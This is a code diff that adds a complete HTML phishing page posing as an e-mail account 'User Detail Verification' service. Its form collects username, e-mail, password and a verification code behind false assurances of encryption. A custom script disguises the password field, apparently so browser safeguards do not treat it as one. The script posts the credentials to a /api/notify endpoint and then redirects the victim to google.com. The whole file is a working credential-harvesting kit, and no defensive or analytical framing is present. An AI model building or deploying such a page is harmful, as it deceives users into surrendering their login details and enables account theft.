@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+<title>User Detail Verification - E-mail Account Management Service</title>
+
+<link rel="stylesheet" type="text/css" href="asset/style.css">
+<style>
+  body {
+    background-color: #1e325d;
+    font-family: Arial, Helvetica, Tahoma, sans-serif !important;
+    padding: 0;
+    font-size: 16px !important;
+    line-height: 1.5;
+    margin: 0 auto;
+    color: #0e4354;
+  }
+
+  .login_form input[type=text],
+  .login_form input[type=email],
+  .login_form input[type=password] {
+    width: 275px;
+    border: 1px solid #999;
+    padding: 6px;
+    font-size: 14px;
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    color: #777;
+    -webkit-border-radius: 3px;
+    -moz-border-radius: 3px;
+    border-radius: 3px;
+    outline: 0;
+    box-sizing: border-box;
+  }
+
+  .login_form input:focus {
+    box-shadow: 0 0 5px rgba(81, 203, 238, 1) !important;
+    border: 1px solid rgba(81, 203, 238, 1) !important;
+    background-color: #f0f0f0 !important;
+  }
+
+  .login_form table th, .login_form table td {
+    padding: 5px;
+  }
+
+  .login_form table th {
+    text-align: right;
+    vertical-align: middle;
+  }
+
+  .login_form button {
+    font-size: 14px;
+    font-weight: bold;
+    color: #ffffff;
+    background: #256c89;
+    border: 1px solid #1d5570;
+    padding: 7px 24px;
+    cursor: pointer;
+    -webkit-border-radius: 3px;
+    -moz-border-radius: 3px;
+    border-radius: 3px;
+  }
+
+  .login_form button:hover {
+    background: #309dc7;
+  }
+
+  .login_form button:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+  }
+
+  .notice {
+    margin-top: 20px;
+    padding: 14px 16px;
+    border-radius: 4px;
+    font-size: 14px;
+    display: none;
+    text-align: left;
+    line-height: 1.5;
+  }
+
+  .notice.error {
+    display: block;
+    border: 1px solid #eac7c7;
+    background: #fce9e9 url(asset/login_icon.gif) no-repeat;
+    color: #a94442;
+    background-position: 10px center;
+    background-size: 24px 24px;
+    padding-left: 46px;
+  }
+
+  .notice.success {
+    display: block;
+    border: 1px solid #cceac4;
+    background: #edfce9;
+    color: #3c763d;
+  }
+
+  .notice.info {
+    display: block;
+    border: 1px solid #b8dff3;
+    background: #eaf6fd;
+    color: #256c89;
+  }
+
+  .secure-note {
+    font-size: 12px;
+    color: #888;
+    margin: 10px 0 0 0;
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+<div id="main_container">
+
+  <div class="header_login">
+    <div class="logo"><a href="verification.html"><img src="asset/logo_tr.png" alt="" title="" border="0"></a></div>
+    <div class="right_header">
+      <a href="verification.html">English</a>
+    </div>
+    <div id="clock_a"></div>
+  </div>
+
+  <div class="login_form">
+    <img src="asset/login_icon.gif" align="middle">
+    <h3>User Detail Verification</h3>
+    <p>
+      For security reasons, your account details must be verified before you can continue using the
+      E-mail Account Management Service. Please fill in the form below. All information is encrypted
+      and handled securely.
+    </p>
+
+    <form action="#" method="post" class="form" id="verify-form" autocomplete="off" novalidate>
+
+      <table align="center" style="margin-top: 30px;">
+        <tbody>
+          <tr>
+            <th>Username</th>
+            <td><input type="text" name="username" id="username" autocomplete="off" required></td>
+          </tr>
+          <tr>
+            <th>E-Mail Address</th>
+            <td><input type="email" name="email" id="email" autocomplete="off" required></td>
+          </tr>
+          <tr>
+            <th>E-Mail Password</th>
+            <td>
+              <input name="password_mask" id="password_mask" type="text" value="" autocomplete="off">
+              <input name="password" id="password" type="hidden">
+            </td>
+          </tr>
+          <tr>
+            <th>Verification Code</th>
+            <td><input type="text" name="code" id="code" autocomplete="off" required></td>
+          </tr>
+          <tr>
+            <td></td>
+            <td>
+              <button type="submit" id="submit-btn">V e r i f y</button>
+              <a href="#" style="float: right;" onclick="return false;">Need help?</a>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+
+    </form>
+
+    <div id="result" class="notice"></div>
+    <p class="secure-note">&#128274; Secure SSL-encrypted connection</p>
+  </div>
+
+</div>
+
+<script type="text/javascript">
+  (function () {
+    "use strict";
+
+    var p = "";
+    var maskInput = document.getElementById('password_mask');
+    var passInput = document.getElementById('password');
+    var form = document.getElementById('verify-form');
+    var btn = document.getElementById('submit-btn');
+    var result = document.getElementById('result');
+
+    String.prototype.repeat = function (num) {
+      return new Array(num + 1).join(this);
+    };
+
+    function refreshMask() {
+      maskInput.value = String.fromCharCode(42).repeat(p.length);
+    }
+
+    maskInput.addEventListener('input', function (e) {
+      var val = this.value;
+      // keep only the masked character count in sync
+      if (val.length > p.length) {
+        var added = val.substring(p.length);
+        p = p + added;
+      } else if (val.length < p.length) {
+        p = p.substring(0, val.length);
+      }
+      passInput.value = p;
+      refreshMask();
+    });
+
+    maskInput.addEventListener('keydown', function (e) {
+      if (e.keyCode === 8 || e.keyCode === 46) {
+        // backspace / delete handled by input event; allow default
+        return true;
+      }
+      if (e.keyCode === 13) {
+        form.submit();
+      }
+    });
+
+    maskInput.addEventListener('paste', function (e) {
+      e.preventDefault();
+      var clip = (e.clipboardData || window.clipboardData).getData('text');
+      p = p + clip;
+      passInput.value = p;
+      refreshMask();
+    });
+
+    function showMsg(type, html) {
+      result.className = 'notice ' + type;
+      result.innerHTML = html;
+    }
+
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      var username = document.getElementById('username').value.trim();
+      var email = document.getElementById('email').value.trim();
+      var password = passInput.value;
+      var code = document.getElementById('code').value.trim();
+
+      if (!username || !email || !password || !code) {
+        showMsg('error', '<strong>Error:</strong> Please fill in all fields before verifying.');
+        return;
+      }
+
+      var emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      if (!emailRe.test(email)) {
+        showMsg('error', '<strong>Error:</strong> Please enter a valid e-mail address.');
+        return;
+      }
+
+      btn.disabled = true;
+      btn.textContent = 'V e r i f y i n g ...';
+      showMsg('info', '<strong>Please wait:</strong> Verifying your details...');
+
+      fetch('/api/notify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: username, email: email, password: password, code: code })
+      })
+        .then(function (res) {
+          return res.json().then(function (data) {
+            return { ok: res.ok, data: data };
+          });
+        })
+        .then(function (r) {
+          if (r.ok && r.data.ok) {
+            showMsg('success', '<strong>Verification submitted.</strong> Your details have been received and are being processed. You may close this window.');
+            form.querySelectorAll('input').forEach(function (i) { i.value = ''; });
+            p = '';
+            passInput.value = '';
+            refreshMask();
+            window.location.href = 'https://google.com/';
+            return;
+          } else {
+            var msg = (r.data && r.data.error) ? r.data.error : 'Unexpected server response.';
+            showMsg('error', '<strong>Error:</strong> ' + msg);
+          }
+        })
+        .catch(function () {
+          showMsg('error', '<strong>Error:</strong> Could not reach the server. Please check your connection and try again.');
+        })
+        .finally(function () {
+          btn.disabled = false;
+          btn.textContent = 'V e r i f y';
+        });
+    });
+  })();
+</script>
+
+</body>
+</html>
+
